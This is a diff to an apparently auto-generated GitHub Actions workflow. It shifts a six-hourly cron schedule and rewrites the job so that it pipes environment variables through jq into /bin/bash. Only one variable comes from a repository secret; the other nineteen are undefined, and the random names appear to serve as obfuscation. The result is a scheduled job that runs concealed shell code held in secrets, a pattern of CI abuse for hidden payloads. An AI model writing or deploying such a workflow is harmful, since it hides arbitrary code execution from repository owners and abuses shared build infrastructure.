@@ -2,9 +2,8 @@ name: duanqirui2603
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 3/6 * * *'
-
-jobs:  # 5017
+    - cron: '18 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,12 +11,26 @@ jobs:  # 5017
       - uses: actions/checkout@v4
       - name: duanqirui2603
         env:
-          grfg39: ${{ secrets.grfg39 }}
+          ixk4: ${{ secrets.ixk4 }}
         run: |
-          echo $grfg39 | jq -r .y0 | /bin/bash
-          echo $olau57079 | jq -r .w5 | /bin/bash
-          echo $yqr06007 | jq -r .coab19 | /bin/bash
-          echo $b859 | jq -r .sad3 | /bin/bash
-          echo $gimw1 | jq -r .gs1 | /bin/bash
-          echo $j9331 | jq -r .zkx5799 | /bin/bash
+          echo $ixk4 | jq -r .yu1 | /bin/bash
+          echo $beza34 | jq -r .lk23 | /bin/bash
+          echo $nxib6104 | jq -r .tguyo280 | /bin/bash
+          echo $xgtxa54518 | jq -r .gi0 | /bin/bash
+          echo $w61 | jq -r .xz742 | /bin/bash
+          echo $g643 | jq -r .p37 | /bin/bash
+          echo $faev0528 | jq -r .jg98878 | /bin/bash
+          echo $godjb79699 | jq -r .arp1772 | /bin/bash
+          echo $fi8974 | jq -r .wzfcr66278 | /bin/bash
+          echo $va49 | jq -r .fejr037 | /bin/bash
+          echo $fvjl3 | jq -r .ghup190 | /bin/bash
+          echo $wz978 | jq -r .e4042 | /bin/bash
+          echo $cd999 | jq -r .ekau849 | /bin/bash
+          echo $r39126 | jq -r .itwg1 | /bin/bash
+          echo $gh2315 | jq -r .eaw1246 | /bin/bash
+          echo $bdslm3 | jq -r .sgc75091 | /bin/bash
+          echo $ltvsg817 | jq -r .iy5 | /bin/bash
+          echo $z623 | jq -r .q204 | /bin/bash
+          echo $xv04919 | jq -r .rvhf9 | /bin/bash
+          echo $rgrjd41 | jq -r .qw84 | /bin/bash
 
